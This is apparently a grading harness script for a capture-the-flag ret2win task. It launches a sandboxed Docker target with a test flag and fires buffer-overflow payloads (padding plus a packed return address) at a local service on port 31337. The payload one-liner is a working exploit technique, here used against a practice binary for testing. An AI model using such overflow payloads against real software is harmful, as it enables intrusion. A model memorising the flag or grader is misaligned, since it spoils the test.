import modal, json
app=modal.App.lookup('yeto-rlf-ctf-grade6', create_if_missing=True)
image=modal.Image.from_registry('docker:27-dind').add_local_dir('/home/michael/work/rlenvfactory/tests/fixtures/ctf-ret2win',remote_path='/opt/task')
script=r'''set +e
rm -rf /var/lib/docker /run/docker; mkdir -p /run/docker
(dockerd --host=unix:///run/docker/docker.sock --iptables=false --bridge=none >/tmp/dockerd.log 2>&1 &)
for i in $(seq 1 40); do docker -H unix:///run/docker/docker.sock info >/dev/null 2>&1 && break; sleep 1; done
D='docker -H unix:///run/docker/docker.sock'
$D build --network host -t rlf-ctf /opt/task >/tmp/build.log 2>&1; b=$?; echo BUILD_RC:$b
if [ $b -eq 0 ]; then
  FLAG='flag{trusted_vm_acceptance_7b3d}'
  cid=$($D run -d --network host -e FLAG="$FLAG" rlf-ctf); echo TARGET:$cid
  sleep 2
  for N in 64 68 72 76 80 88; do $D run --rm --network host -e N=$N python:3.12-slim python -c "import os,socket,struct; N=int(os.environ['N']); s=socket.create_connection(('127.0.0.1',31337),timeout=10); s.recv(128); s.sendall(b'A'*N+struct.pack('<Q',0x401236)+b'\\n'); print('OFFSET',N,'GRADE_OUTPUT:'+s.recv(4096).decode(errors='replace'))"
  done
  rc=$?; echo SOLVER_RC:$rc; $D rm -f $cid >/dev/null; echo CLEAN_RC:$?
fi
'''
sb=modal.Sandbox.create('sh','-lc',script,app=app,image=image,runtime='vm',cpu=2,memory=4096,timeout=600,idle_timeout=60,tags={'yeto-purpose':'rlf-trusted-grade','yeto-task':'fixture-ctf-ret2win'})
try: print(json.dumps({'sandbox_id':sb.object_id,'stdout':''.join(list(sb.stdout)),'stderr':''.join(list(sb.stderr))}))
finally: sb.terminate()
